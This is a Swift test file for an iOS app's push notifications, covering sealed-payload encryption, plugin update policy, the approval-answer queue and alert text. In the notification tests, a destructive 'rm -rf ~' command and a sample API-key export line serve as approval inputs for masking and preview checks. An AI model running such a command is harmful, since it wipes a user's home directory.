// The web app's own native-platform checks (ref240 scripts/native-platform/main.swift: seal(), pushPolicy(),
// notificationCopy(), badge(), sharedPreviewCases()), ported as they were, names changed to HQ Native's. The vectors are
// the files the plugin and the web app share (Tests/Fixtures/push: seal-vectors.json, notification-preview-cases.json).

import Foundation
import Testing
@testable import HermesHQNative

nonisolated enum PushFixtures {
    static func url(_ name: String) -> URL {
        URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent().appendingPathComponent("Fixtures/push/\(name)")
    }
}

private func expect(_ condition: Bool, _ message: String, sourceLocation: SourceLocation = #_sourceLocation) {
    if !condition { Issue.record(Comment(rawValue: message), sourceLocation: sourceLocation) }
}

private enum Ported {
    static func seal() {
        let url = PushFixtures.url("seal-vectors.json")
        guard let data = try? Data(contentsOf: url), let doc = (try? JSONSerialization.jsonObject(with: data)) as? [String: Any],
              let key = (doc["key"] as? String).flatMap({ Data(base64Encoded: $0) }), let cases = doc["cases"] as? [[String: Any]] else {
            return expect(false, "seal vectors readable")
        }
        expect(PushSeal.kid(key) == doc["kid"] as? String, "a key's id is its SHA-256's first 8 bytes")
        expect(PushSeal.aad == Data((doc["aad"] as? String ?? "").utf8), "the seal binds the same associated data")
        let other = PushSeal.makeKey()
        expect(other.count == 32 && other != PushSeal.makeKey(), "fresh 256-bit keys")
        for item in cases {
            let name = item["name"] as? String ?? "", outer = item["outer"] as? [String: Any] ?? [:], inner = item["inner"] as? [String: Any] ?? [:]
            let opened = PushSeal.open(outer, keys: [other, key])
            expect(opened.map { NSDictionary(dictionary: $0).isEqual(to: inner) } == true, "\(name): opens to exactly what was sealed")
            expect(PushSeal.open(outer, keys: [other]) == nil, "\(name): another account's key doesn't open it")
            var info = PushSeal.opened(outer, keys: [key])
            expect(info["seal"] == nil && (info["dispatch"] as? [String: Any])?["account"] as? String == "c0ffee" + String(repeating: "c0ffee", count: 9) + "c0de", "\(name): the app reads the opened dispatch fields")
            info = PushSeal.opened(outer, keys: [])
            expect(info["seal"] != nil && info["dispatch"] == nil, "\(name): unopened, a push stays as it came")
            // One bit flipped anywhere in the box: refused.
            if var seal = outer["seal"] as? [String: Any], var box = (seal["box"] as? String).flatMap({ Data(base64Encoded: $0) }) {
                box[box.count - 1] ^= 1; seal["box"] = box.base64EncodedString()
                var tampered = outer; tampered["seal"] = seal
                expect(PushSeal.open(tampered, keys: [key]) == nil, "\(name): a tampered box doesn't open")
            }
        }
        let byName = Dictionary(uniqueKeysWithValues: cases.map { ($0["name"] as? String ?? "", $0["inner"] as? [String: Any] ?? [:]) })
        let approval = PushSeal.alert(byName["approval"] ?? [:])
        expect(approval == PushSeal.Alert(title: "Sam", subtitle: "", body: "Wants to run: npm run deploy", thread: "20261003_101500_ab12cd", category: "DISPATCH_APPROVAL", relevance: 1.0), "an opened approval shows the command and offers Approve/Deny")
        let turn = PushSeal.alert(byName["turnDone"] ?? [:])
        expect(turn?.title == "Sam" && turn?.body.hasPrefix("The launch plan is ready.") == true && turn?.category == "" && turn?.relevance == 0.6, "an opened reply previews it, with no actions")
        expect(PushSeal.alert(byName["who-only"] ?? [:])?.body == "New reply from Sam", "Show Previews off: only who, even sealed")
        expect(PushSeal.alert(byName["settled"] ?? [:]) == nil, "a settle shows nothing")
        expect(PushSeal.open(["aps": ["alert": "hi"]], keys: [key]) == nil && PushSeal.open(["seal": ["v": 2, "kid": doc["kid"] ?? "", "box": ""]], keys: [key]) == nil, "only version 1 seals")
        expect(PushPolicy.seals(["seal": true]) && PushPolicy.seals(["seal": 1]) && !PushPolicy.seals(["seal": false]) && !PushPolicy.seals([:]) && !PushPolicy.seals(nil), "the key goes only to a plugin that seals")
        expect(!PushPolicy.mayAnswer("approve", delivered: ["seal": ["v": 1], "aps": [:]]) && PushPolicy.mayAnswer("deny", delivered: ["seal": ["v": 1]])
               && PushPolicy.mayAnswer("approve", delivered: ["dispatch": ["request": "r"]]) && PushPolicy.mayAnswer("com.apple.UNNotificationDefaultActionIdentifier", delivered: ["seal": [:]]),
               "X-04: Approve on an alert iOS showed still sealed (no command on screen) is never sent; Deny and taps are")
        expect(PushPolicy.current(["seal": true, "replies": "watcher", "ownChats": true, "quietStandIns": true, "desktopOpens": true, "askCards": true, "pagePreviews": true, "warmup": true, "desktopForward": true, "gatewayLogins": true, "namedSites": true, "deviceAccess": true, "deviceAccessKinds": true, "liveSteps": true, "liveEnds": true, "liveQuick": true, "terminal": true, "tasks": true, "draftCards": true, "pluginUpdates": true, "task_fields": true, "pluginVersion": "0.9.47"])
               && !PushPolicy.current(["seal": true, "ownChats": true, "quietStandIns": true, "desktopOpens": true, "askCards": true, "pagePreviews": true, "warmup": true, "desktopForward": true, "gatewayLogins": true, "namedSites": true, "deviceAccess": true, "deviceAccessKinds": true, "liveSteps": true, "liveEnds": true, "liveQuick": true, "terminal": true])
               && !PushPolicy.current(["replies": "watcher", "ownChats": true, "quietStandIns": true, "desktopOpens": true, "askCards": true, "pagePreviews": true, "warmup": true, "desktopForward": true, "gatewayLogins": true, "namedSites": true, "deviceAccess": true, "deviceAccessKinds": true, "liveSteps": true, "liveEnds": true, "liveQuick": true, "terminal": true]),
               "only a sealing plugin that alerts every bot's replies (0.3) is current; 0.2 is offered an update")
        expect(!PushPolicy.current(["seal": true, "replies": "watcher"]) && !PushPolicy.current(["seal": true, "replies": "watcher", "ownChats": false]),
               "0.9.0 and older (no ownChats) are offered the update: without it Hermes refuses a Nous sign-in its own chats")
        expect(!PushPolicy.current(["seal": true, "replies": "watcher", "ownChats": true]),
               "0.9.8 and older (no quietStandIns) are offered the update: they alert \"[Notification processed; …]\"")
        expect(!PushPolicy.current(["seal": true, "replies": "watcher", "ownChats": true, "quietStandIns": true]),
               "0.9.10 and older (no desktopOpens) are offered the update: the desktop app can't open the chats this app made")
        expect(!PushPolicy.current(["seal": true, "replies": "watcher", "ownChats": true, "quietStandIns": true, "desktopOpens": true]),
               "0.9.11 and older (no askCards) are offered the update: their bots ask questions in text, not on a card")
        expect(!PushPolicy.current(["seal": true, "replies": "watcher", "ownChats": true, "quietStandIns": true, "desktopOpens": true, "askCards": true]),
               "0.9.12 and older (no pagePreviews) are offered the update: Hermes reads every chat's first message to list one page")
        expect(!PushPolicy.current(["seal": true, "replies": "watcher", "ownChats": true, "quietStandIns": true, "desktopOpens": true, "askCards": true, "pagePreviews": true]),
               "0.9.14 and older (no warmup) are offered the update: the first chat opened after Hermes restarts waits while its bot loads")
        expect(!PushPolicy.current(["seal": true, "replies": "watcher", "ownChats": true, "quietStandIns": true, "desktopOpens": true, "askCards": true, "pagePreviews": true, "warmup": true]),
               "0.9.15 and older (no desktopForward) are offered the update: a chat open in the desktop app refuses this app's messages")
        expect(!PushPolicy.current(["seal": true, "replies": "watcher", "ownChats": true, "quietStandIns": true, "desktopOpens": true, "askCards": true, "pagePreviews": true, "warmup": true, "desktopForward": true]),
               "0.9.16 and older (no gatewayLogins) are offered the update: a bot another bot messaged can't ask for a login")
        expect(!PushPolicy.current(["seal": true, "replies": "watcher", "ownChats": true, "quietStandIns": true, "desktopOpens": true, "askCards": true, "pagePreviews": true, "warmup": true, "desktopForward": true, "gatewayLogins": true]),
               "0.9.17 and older (no namedSites) are offered the update: a login card can name the wrong site")
        expect(!PushPolicy.current(["seal": true, "replies": "watcher", "ownChats": true, "quietStandIns": true, "desktopOpens": true, "askCards": true, "pagePreviews": true, "warmup": true, "desktopForward": true, "gatewayLogins": true, "namedSites": true]),
               "0.9.18 and older (no deviceAccess) are offered the update: Settings › Device Access can't reach the bots")
        expect(!PushPolicy.current(["seal": true, "replies": "watcher", "ownChats": true, "quietStandIns": true, "desktopOpens": true, "askCards": true, "pagePreviews": true, "warmup": true, "desktopForward": true, "gatewayLogins": true, "namedSites": true, "deviceAccess": true]),
               "0.9.20 and older (no deviceAccessKinds) are offered the update: bots can ask the phone for Contacts only")
        expect(!PushPolicy.current(["seal": true, "replies": "watcher", "ownChats": true, "quietStandIns": true, "desktopOpens": true, "askCards": true, "pagePreviews": true, "warmup": true, "desktopForward": true, "gatewayLogins": true, "namedSites": true, "deviceAccess": true, "deviceAccessKinds": true]),
               "0.9.21 and older (no liveSteps) are offered the update: a reply's Lock Screen card stops on the step it was on once the app is away")
        expect(!PushPolicy.current(["seal": true, "replies": "watcher", "ownChats": true, "quietStandIns": true, "desktopOpens": true, "askCards": true, "pagePreviews": true, "warmup": true, "desktopForward": true, "gatewayLogins": true, "namedSites": true, "deviceAccess": true, "deviceAccessKinds": true, "liveSteps": true]),
               "0.9.22 (no liveEnds) is offered the update: a long reply's card can count on after the reply ended")
        expect(!PushPolicy.current(["seal": true, "replies": "watcher", "ownChats": true, "quietStandIns": true, "desktopOpens": true, "askCards": true, "pagePreviews": true, "warmup": true, "desktopForward": true, "gatewayLogins": true, "namedSites": true, "deviceAccess": true, "deviceAccessKinds": true, "liveSteps": true, "liveEnds": true]),
               "0.9.23 (no liveQuick) is offered the update: a quick reply's Done card stays up 15 minutes")
        expect(!PushPolicy.current(["seal": true, "replies": "watcher", "ownChats": true, "quietStandIns": true, "desktopOpens": true, "askCards": true, "pagePreviews": true, "warmup": true, "desktopForward": true, "gatewayLogins": true, "namedSites": true, "deviceAccess": true, "deviceAccessKinds": true, "liveSteps": true, "liveEnds": true, "liveQuick": true]),
               "0.9.24 (no terminal) is offered the update: the Terminal page has no shell to open")
        expect(PushPolicy.current(["seal": true, "replies": "watcher", "ownChats": true, "quietStandIns": true, "desktopOpens": true, "askCards": true, "pagePreviews": true, "warmup": true, "desktopForward": true, "gatewayLogins": true, "namedSites": true, "deviceAccess": true, "deviceAccessKinds": true, "liveSteps": true, "liveEnds": true, "liveQuick": true, "terminal": false, "tasks": true, "draftCards": true, "pluginUpdates": true, "task_fields": true, "pluginVersion": "0.9.47"]) && PushPolicy.current(["seal": true, "replies": "watcher", "ownChats": true, "quietStandIns": true, "desktopOpens": true, "askCards": true, "pagePreviews": true, "warmup": true, "desktopForward": true, "gatewayLogins": true, "namedSites": true, "deviceAccess": true, "deviceAccessKinds": true, "liveSteps": true, "liveEnds": true, "liveQuick": true, "terminal": true, "terminalOff": true, "tasks": true, "draftCards": true, "pluginUpdates": true, "task_fields": true, "pluginVersion": "0.9.47"]),
               "a 0.9.44 that can't open a shell (Windows) or has it turned off is current: no update would change that")
        expect(!PushPolicy.current(["seal": true, "replies": "watcher", "ownChats": true, "quietStandIns": true, "desktopOpens": true, "askCards": true, "pagePreviews": true, "warmup": true, "desktopForward": true, "gatewayLogins": true, "namedSites": true, "deviceAccess": true, "deviceAccessKinds": true, "liveSteps": true, "liveEnds": true, "liveQuick": true, "terminal": true]),
               "0.9.25 to 0.9.31 (no tasks) is offered the update: the Tasks page has no list to read")
        expect(!PushPolicy.current(["seal": true, "replies": "watcher", "ownChats": true, "quietStandIns": true, "desktopOpens": true, "askCards": true, "pagePreviews": true, "warmup": true, "desktopForward": true, "gatewayLogins": true, "namedSites": true, "deviceAccess": true, "deviceAccessKinds": true, "liveSteps": true, "liveEnds": true, "liveQuick": true, "terminal": true, "tasks": true, "pluginVersion": "0.9.41"]) && !PushPolicy.current(["seal": true, "replies": "watcher", "ownChats": true, "quietStandIns": true, "desktopOpens": true, "askCards": true, "pagePreviews": true, "warmup": true, "desktopForward": true, "gatewayLogins": true, "namedSites": true, "deviceAccess": true, "deviceAccessKinds": true, "liveSteps": true, "liveEnds": true, "liveQuick": true, "terminal": true, "tasks": true]),
               "0.9.32 to 0.9.41 (pictures a scheduled job sends can be dropped from its Bot Chat summary) is offered the update")
        expect(!PushPolicy.current(["seal": true, "replies": "watcher", "ownChats": true, "quietStandIns": true, "desktopOpens": true, "askCards": true, "pagePreviews": true, "warmup": true, "desktopForward": true, "gatewayLogins": true, "namedSites": true, "deviceAccess": true, "deviceAccessKinds": true, "liveSteps": true, "liveEnds": true, "liveQuick": true, "terminal": true, "tasks": true, "pluginVersion": "0.9.43"]),
               "0.9.42 and 0.9.43 (a login or code card can name another site's tab left open) is offered the update")
        expect(!PushPolicy.current(["seal": true, "replies": "watcher", "ownChats": true, "quietStandIns": true, "desktopOpens": true, "askCards": true, "pagePreviews": true, "warmup": true, "desktopForward": true, "gatewayLogins": true, "namedSites": true, "deviceAccess": true, "deviceAccessKinds": true, "liveSteps": true, "liveEnds": true, "liveQuick": true, "terminal": true, "tasks": true, "pluginVersion": "0.9.44"]),
               "0.9.44 (the daily Task ideas run is turned away on a newer Hermes) is offered the update")
        expect((cases.first?["outer"] as? [String: Any]).flatMap { ($0["aps"] as? [String: Any])?["alert"] as? [String: String] } == ["title": "Hermes HQ", "body": "New notification"],
               "a sealed alert the phone can't open says Hermes HQ")
        expect(PushPolicy.routes(preferring: nil) == ["/api/plugins/hermes-hq-push", "/api/plugins/dispatch-push"]
               && PushPolicy.routes(preferring: PushPolicy.route) == PushPolicy.routes(preferring: nil)
               && PushPolicy.routes(preferring: "/api/plugins/dispatch-push") == ["/api/plugins/dispatch-push", "/api/plugins/hermes-hq-push"],
               "the renamed plugin's route first; a device registered with the old dispatch-push is reached there first")
        let fresh: [String: Any] = ["seal": true, "replies": "watcher", "ownChats": true, "quietStandIns": true, "desktopOpens": true, "askCards": true, "pagePreviews": true, "warmup": true, "desktopForward": true, "gatewayLogins": true, "namedSites": true, "deviceAccess": true, "deviceAccessKinds": true, "liveSteps": true, "liveEnds": true, "liveQuick": true, "terminal": true, "tasks": true, "draftCards": true, "pluginUpdates": true, "task_fields": true, "pluginVersion": "0.9.47"]
        expect(PushPolicy.pluginState(status: 200, body: fresh, legacy: false).rawValue == "ready"
               && PushPolicy.pluginState(status: 200, body: fresh, legacy: true).rawValue == "outdated"
               && PushPolicy.pluginState(status: 200, body: ["seal": true], legacy: false).rawValue == "outdated"
               && PushPolicy.pluginState(status: 404, body: nil, legacy: false).rawValue == "missing"
               && PushPolicy.pluginState(status: 0, body: nil, legacy: false).rawValue == "unknown",
               "an old dispatch-push is offered the update to hermes-hq-push, never treated as missing")
    }

    static func pushPolicy() {
        typealias A = PushAnswers
        typealias P = PushPolicy
        let now = Date(timeIntervalSince1970: 10000)
        func answer(_ id: String = "fixture-request", age: Double = 0, choice: String = "once") -> A.Answer {
            .init(request: id, sessionKey: "fixture-key", token: "fixture-token", session: "fixture-session", choice: choice, owner: "O", tappedAt: now.addingTimeInterval(-age))
        }
        var queue = A()
        let tap = answer()
        expect(queue.enqueue(tap) == .queued, "cold launch persists a tap with registration O")
        expect(queue.decision(tap, owner: nil, ready: false, now: now) == .waiting, "cold launch without call or authenticated owner waits")
        expect(queue.decision(tap, owner: "O", ready: false, now: now) == .waiting, "authenticated owner without call waits")
        expect(queue.decision(tap, owner: nil, ready: true, now: now) == .waiting, "call without authenticated owner waits")
        expect(queue.enqueue(answer(choice: "deny")) == .duplicate && queue.pending.first?.choice == "once", "duplicate tap: first choice wins")
        queue = A.decode(try? JSONEncoder().encode(queue))
        expect(queue.pending == [tap], "all queued answer fields survive relaunch")
        var sent = 0
        for _ in 0..<2 {
            for item in queue.pending where queue.decision(item, owner: "O", ready: true, now: now) == .send {
                sent += 1
                expect(queue.result(item, status: 200, resolved: 1) == .answered, "200 resolved one answers")
            }
        }
        expect(sent == 1 && queue.pending.isEmpty, "restored cold launch sends exactly once")
        queue = A.decode(try? JSONEncoder().encode(queue))
        expect(queue.enqueue(tap) == .duplicate, "answered ids persist across relaunch")
        expect(A.decode(Data("unreadable".utf8)).pending.isEmpty && A.decode(nil).answered.isEmpty, "unreadable or absent storage is empty")
        // P2-5: a saved gateway removed from this phone takes only its own waiting answers with it.
        var shared = A()
        let other = A.Answer(request: "other-request", sessionKey: "k", token: "t", session: "s", choice: "deny", owner: "Q", tappedAt: now)
        _ = shared.enqueue(tap); _ = shared.enqueue(other)
        shared.drop(owner: "O")
        expect(shared.pending == [other] && shared.enqueue(tap) == .duplicate, "removing account O drops its answers (never resent) and keeps Q's")
        queue = A(); _ = queue.enqueue(tap); queue.settle(tap.request)
        expect(queue.pending.isEmpty && queue.enqueue(tap) == .duplicate, "settle push drops queued tap and prevents resending")
        queue = A(); _ = queue.enqueue(answer(age: 600))
        expect(queue.decision(answer(age: 600), owner: "O", ready: true, now: now) == .expired, "ten minutes expires")
        expect(queue.pending.isEmpty, "expiry drops queued answer")
        expect(queue.decision(answer(age: 601), owner: nil, ready: false, now: now) == .expired, "expiry does not require auth")
        expect(queue.decision(answer(age: 540), owner: "O", ready: true, now: now) == .send, "nine minutes still sends")
        queue = A(); _ = queue.enqueue(tap)
        expect(queue.decision(tap, owner: "P", ready: true, now: now) == .stale, "another account never sends the answer")
        expect(queue.pending.isEmpty, "stale owner drops queued answer")
        for (status, resolved, expected) in [(0, 0, A.Outcome.waiting), (200, 0, .failed), (200, 1, .answered), (400, 0, .failed), (403, 0, .failed), (404, 0, .failed), (409, 0, .failed), (422, 0, .failed), (500, 0, .failed)] {
            queue = A(); _ = queue.enqueue(tap)
            expect(queue.result(tap, status: status, resolved: resolved) == expected, "answer HTTP \(status), resolved \(resolved)")
            expect(queue.pending.isEmpty == (status != 0), "only transport failure keeps the tap queued")
        }
        queue = A()
        for index in 0..<70 { queue.settle("fixture-\(index)") }
        expect(queue.answered.count == 64 && queue.answered.first == "fixture-6", "last 64 terminal request ids retained")

        var ledger = PushLedger()
        ledger.registered("O", kinds: ["turnDone", "approval"])
        ledger.removal("O", status: 0); ledger.clear()
        expect(ledger.owner == nil && ledger.owed == ["O"], "offline sign-out retains removal after local clear")
        queue = A()
        expect(queue.pending.isEmpty && ledger.owner == nil, "signed-out state has no registration for a stale tap")
        ledger = .decode(try? JSONEncoder().encode(ledger))
        expect(ledger.needsRemoval("O"), "relaunch retains O's removal")
        ledger.switchTo("O")
        expect(ledger.needsRemoval("O"), "notifications off on next sign-in retries O's DELETE")
        ledger.removal("O", status: 404)
        expect(!ledger.needsRemoval("O") && ledger.owed.isEmpty, "404 settles removal")
        for status in [200, 204] {
            ledger.owe("O"); ledger.removal("O", status: status)
            expect(!ledger.needsRemoval("O"), "successful DELETE settles removal")
        }
        ledger.owe("O"); ledger.registered("O", kinds: ["turnDone"])
        expect(ledger.owed.isEmpty && ledger.owner == "O", "successful PUT supersedes removal")
        ledger = .decode(try? JSONEncoder().encode(ledger))
        expect(ledger.owner == "O" && ledger.kinds == ["turnDone"], "registration and delivered kinds survive relaunch")
        ledger.unavailable()
        expect(ledger.owner == "O" && ledger.kinds.isEmpty && ledger.needsRemoval("O"), "a plugin that stops answering delivers nothing (local alerts return) but its registration stays owned")
        ledger.switchTo("P")
        expect(ledger.owed == ["O"] && !ledger.needsRemoval("P"), "switch to P never targets O's deletion")
        ledger.registered("P", kinds: ["approval"])
        expect(ledger.owner == "P" && ledger.owed == ["O"], "P's PUT keeps O owed")
        for index in 0..<6 { ledger.owe("owner-\(index)") }
        expect(ledger.owed == ["owner-2", "owner-3", "owner-4", "owner-5"], "four removal owners, oldest dropped")
        ledger = .decode(nil, legacy: true)
        expect(ledger.unknown && ledger.needsRemoval("O"), "old true flag migrates to unknown registration")
        ledger.removal("O", status: 0); ledger.clear()
        expect(ledger.unknown && ledger.owed == ["O"], "failed legacy removal survives clear")
        ledger.removal("O", status: 404)
        expect(!ledger.unknown && ledger.owed.isEmpty, "successful legacy removal settles unknown")
        ledger = .decode(nil, legacy: true); ledger.registered("O", kinds: [])
        expect(!ledger.unknown && ledger.owner == "O", "successful registration adopts legacy ownership")
        expect(!PushLedger.decode(nil).unknown, "old false flag has no registration")
        // Review r8 (Opus 4, Astra 4): an offline restore names the old flag's account; a sign-in elsewhere keeps it owed.
        ledger = .decode(nil, legacy: true); ledger.adopt("O")
        expect(!ledger.unknown && ledger.owed == ["O"] && !ledger.needsRemoval("P"), "restore adopts the old flag's removal for the saved account")
        ledger.registered("P", kinds: ["approval"]); ledger.clear()
        expect(ledger.needsRemoval("O") && ledger.owed == ["O", "P"], "P's PUT and sign-out never settle O's legacy removal")
        ledger = PushLedger(); ledger.adopt("O")
        expect(ledger.owed.isEmpty, "adopt without the old flag owes nothing")

        // Review r8 (Astra 2): a PUT whose answer was lost may have registered us; its alerts stay answerable.
        ledger = PushLedger(); ledger.attempt("O")
        expect(ledger.owner == nil && ledger.candidate == "O" && ledger.needsRemoval("O") && ledger.kinds.isEmpty, "unconfirmed PUT: owed and answerable, nothing delivered")
        ledger = .decode(try? JSONEncoder().encode(ledger))
        expect(ledger.sender(nil) == "O" && ledger.sender("O") == "O", "a cold-launch tap after a lost PUT answer goes to that account")
        ledger.registered("O", kinds: ["approval"])
        expect(ledger.candidate == nil && ledger.owner == "O" && ledger.owed.isEmpty, "confirmed PUT replaces the candidate")
        ledger = PushLedger(); ledger.attempt("O"); ledger.clear()
        expect(ledger.candidate == nil && ledger.owed == ["O"] && ledger.sender(nil) == nil, "sign-out: the unconfirmed account owes a removal and its alerts aren't answerable")
        ledger = PushLedger(); ledger.attempt("O"); ledger.switchTo("P")
        expect(ledger.candidate == nil && ledger.owed == ["O"], "switching accounts drops the candidate but keeps its removal")
        ledger = PushLedger(); ledger.attempt("O"); ledger.removal("O", status: 404)
        expect(ledger.candidate == nil && ledger.owed.isEmpty && ledger.sender(nil) == nil, "a settled removal drops the candidate")
        let older = PushLedger.decode(Data(#"{"owner":"O","unknown":false,"owed":[],"kinds":["turnDone"]}"#.utf8))
        expect(older.owner == "O" && older.candidate == nil && older.kinds == ["turnDone"], "a ledger saved before the candidate field still decodes")

        // Review r8 (Opus 3, Astra 1): an answer never goes to a different account.
        ledger = PushLedger(); ledger.registered("O", kinds: ["approval"])
        expect(ledger.sender(nil) == "O" && ledger.sender("O") == "O" && ledger.sender("P") == nil, "one account: untagged alerts are its; another tag is refused")
        ledger.switchTo("P"); ledger.registered("P", kinds: ["approval"])
        expect(ledger.owed == ["O"] && ledger.sender(nil) == nil, "while O may still push here, an untagged alert fails closed")
        expect(ledger.sender("P") == "P" && ledger.sender("O") == nil, "a tagged alert answers only for the registered account")
        ledger.removal("O", status: 404)
        expect(ledger.sender(nil) == "P", "once O's removal settles, untagged alerts are P's again")
        expect(PushLedger.decode(nil, legacy: true).sender(nil) == nil, "the old flag alone answers nothing")

        // Review r8 (Astra 3): a probe that stops advertising a kind brings its local alerts back even if the PUT fails.
        ledger = PushLedger(); ledger.registered("O", kinds: ["turnDone", "approval"])
        ledger.advertised(["turnDone"])
        expect(ledger.owner == "O" && ledger.kinds == ["turnDone"], "unadvertised kind leaves the delivered set at once")
        ledger.advertised(["turnDone", "approval"])
        expect(ledger.kinds == ["turnDone"], "a newly advertised kind counts only after a PUT lands")
        ledger.advertised(P.kinds(["delivery": NSNull(), "kinds": ["turnDone", "approval"]]))
        expect(ledger.kinds.isEmpty && ledger.owner == "O", "a plugin that can't deliver suppresses no local alert")

        let owner = P.owner(url: "https://Gateway.example:9119/", username: "fixture-user")
        expect(owner.count == 64 && owner == P.owner(url: "https://gateway.example:9119", username: "fixture-user"), "owner normalizes host and trailing slash")
        expect(owner != P.owner(url: "https://gateway.example:9119", username: "other-user"), "owner separates usernames")
        expect(owner != P.owner(url: "https://gateway.example:9120", username: "fixture-user"), "owner separates ports")
        expect(P.kinds(nil) == ["turnDone", "approval"] && P.kinds(["kinds": "bad"]) == ["turnDone", "approval"], "missing and malformed kinds use compatibility default")
        expect(P.kinds(["kinds": []]) == [], "empty advertised kinds stays empty")
        expect(P.kinds(["kinds": ["jobDone"]]) == [], "unknown kinds ignored")
        expect(P.kinds(["kinds": ["turnDone", "approval"]]) == ["turnDone", "approval"], "both supported kinds")
        // Review r8 (Opus 2): push.status_body reports delivery null with no APNs key or a refused relay URL.
        expect(P.kinds(["delivery": NSNull(), "kinds": ["turnDone", "approval"]]) == [], "delivery null delivers nothing")
        expect(P.enabledKinds(["delivery": NSNull(), "kinds": ["turnDone", "approval"]], preferences: [:]) == [], "delivery null registers no kind")
        expect(P.kinds(["delivery": "Direct", "kinds": ["turnDone", "approval"]]) == ["turnDone", "approval"] && P.kinds(["delivery": "Relay"]) == ["turnDone", "approval"], "a named sender delivers what it lists")
        expect(P.enabledKinds(["kinds": ["turnDone", "approval"]], preferences: ["approval": false]) == ["turnDone"], "settings disables an advertised kind")
        expect(P.enabledKinds(["kinds": ["turnDone"]], preferences: ["approval": true]) == ["turnDone"], "settings cannot enable an unadvertised kind")
        // [prompt-alerts] the add-on's password and question alerts, under the Input Needed switch.
        expect(P.enabledKinds(["kinds": ["turnDone", "approval", "input"]], preferences: [:]) == ["turnDone", "approval", "input"], "input is kept when advertised")
        expect(P.enabledKinds(["kinds": ["turnDone", "approval", "input"]], preferences: ["input": false]) == ["turnDone", "approval"], "Input Needed off asks for no input push")
        expect(P.enabledKinds(["kinds": ["turnDone", "approval", "inputX"]], preferences: [:]) == ["turnDone", "approval"], "unknown kinds are still dropped")
        expect(P.delivers("message.complete", kinds: ["turnDone"]) && !P.delivers("approval.request", kinds: ["turnDone"]), "local suppression matches only delivered kinds")
        expect(P.delivers("approval.request", kinds: ["approval"]) && !P.delivers("message.complete", kinds: []), "approval mapping and no registration kinds")
        
    }

    static func notificationCopy() {
        typealias P = NotificationText
        let ivy = NotificationWho(sender: "Ivy", chat: "Quarterly report", bot: true)
        // D22 (owners stream, native half): a local alert carries its bot's profile; an Approve/Deny reads it back, and an
        // alert from before build 161 (none) or a junk value answers on the chat's own profile ("").
        let localInfo = P.localInfo(session: "20260929_120000_aabbcc02", stored: "20260929_120000_aabbcc03", request: "req-1", kind: "approval.request", profile: "ivy")
        expect(localInfo["profile"] == "ivy" && localInfo["stored"] == "20260929_120000_aabbcc03" && localInfo["request"] == "req-1", "a local alert names its bot's profile")
        expect(P.actionProfile(localInfo as [AnyHashable: Any]) == "ivy", "Approve/Deny on it carries that profile to the renderer")
        expect(P.actionProfile(["session": "x"]) == "" && P.actionProfile(["profile": 7]) == "" && P.actionProfile(["profile": "a\nb"]) == ""
               && P.actionProfile(["profile": String(repeating: "p", count: 200)]) == "", "an old alert or a junk profile answers on the chat's own profile")
        // Codex N11: a reply observed before a sign-out or switch never posts after it.
        expect(P.mayPost(observed: 3, current: 3) && !P.mayPost(observed: 3, current: 4), "an alert posts only under the sign-in it was observed in")
        // Title = who, subtitle = which chat, body = what (docs/notifications.md).
        expect(P.notification(kind: "message.complete", who: ivy, text: "# Done\n- Fixed the **flaky** test") == NotificationCopy(title: "Ivy", subtitle: "Quarterly report", body: "Done: Fixed the flaky test"), "reply: bot, chat, preview")
        expect(P.notification(kind: "turnDone", who: NotificationWho(sender: "Ivy", chat: "Bot Chat", bot: true), text: "OK").title == "Ivy", "a bot's chat is titled by the bot, never \"Bot Chat\"")
        expect(P.notification(kind: "turnDone", who: NotificationWho(sender: "Ivy", chat: "Bot Chat", bot: true), text: "OK").subtitle == "", "a generic chat title is no subtitle")
        expect(P.notification(kind: "turnDone", who: NotificationWho(sender: "Ivy", chat: "New chat", bot: true), text: "OK").subtitle == "", "New chat is generic")
        expect(P.notification(kind: "turnDone", who: NotificationWho(sender: "Ivy", chat: "Ivy", bot: true), text: "OK").subtitle == "", "a chat named like its bot is no subtitle")
        let room = P.notification(kind: "turnDone", who: NotificationWho(sender: "Ivy", chat: "Standup", group: "Launch Room", bot: true), text: "Shipped it.")
        expect(room.title == "Ivy · Launch Room" && room.subtitle == "" && room.body == "Shipped it.", "group room: bot · room")
        let plain = P.notification(kind: "turnDone", who: NotificationWho(sender: "Hermes", chat: "Fix the flaky test"), text: "Fixed.")
        expect(plain.title == "Fix the flaky test" && plain.subtitle == "", "plain app chat: its title")
        expect(P.notification(kind: "turnDone", who: NotificationWho(sender: "Hermes", chat: "Bot Chat"), text: "Hi").title == "Hermes", "untitled plain chat: the profile's name")
        expect(P.notification(kind: "turnDone", who: nil, text: "Hi") == NotificationCopy(title: "New reply", body: "Hi"), "unknown sender")
        expect(P.notification(kind: "turnDone", who: ivy, text: "").body == "New reply", "empty reply")
        expect(P.notification(kind: "turnDone", who: ivy, text: "```\nx\n```").body == "[code]", "code-only reply")
        // Approvals: the command, masked and clipped.
        let approval = P.notification(kind: "approval.request", who: ivy, text: "export OPENAI_API_KEY=sk-proj-4f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c\nnpm run deploy")
        expect(approval.title == "Ivy" && approval.body == "Wants to run: export OPENAI_API_KEY=•••• …", "approval command is summarized and masked")
        expect(P.notification(kind: "approval", who: ivy, text: "", body: "Delete the build folder").body == "Delete the build folder", "approval without a command: its description")
        expect(P.notification(kind: "approval", who: nil, text: nil).title == "Approval needed" && P.notification(kind: "approval", who: nil, text: nil).body == "Needs your approval", "approval fallback")
        // Questions, failures, background work.
        expect(P.notification(kind: "input", who: ivy, text: "Which **branch** should I use?").body == "Which branch should I use?", "input: the question")
        expect(P.notification(kind: "input", who: nil, text: nil) == NotificationCopy(title: "Question", body: "Waiting for your answer"), "input fallback")
        expect(P.notification(kind: "turnError", who: ivy, text: "Usage limit reached until 3:00 PM").body == "Couldn’t finish: usage limit reached until 3:00 PM", "error: plain reason")
        expect(P.notification(kind: "turnError", who: nil, text: nil) == NotificationCopy(title: "Reply failed", body: "Couldn’t finish this reply"), "error fallback")
        expect(P.notification(kind: "backgroundDone", who: ivy, text: "Background task finished: npm test").body == "Background task finished: npm test", "background task")
        // Show Previews off: only who needs you (no chat title either, which is written from the chat).
        expect(P.notification(kind: "message.complete", who: ivy, text: "secret plans", previews: false) == NotificationCopy(title: "", body: "New reply from Ivy"), "previews off: reply")
        expect(P.notification(kind: "approval.request", who: ivy, text: "rm -rf ~", previews: false).body == "Ivy needs your approval", "previews off: approval")
        expect(P.notification(kind: "input", who: ivy, text: "Your SSN?", previews: false).body == "Ivy is waiting for your answer", "previews off: input")
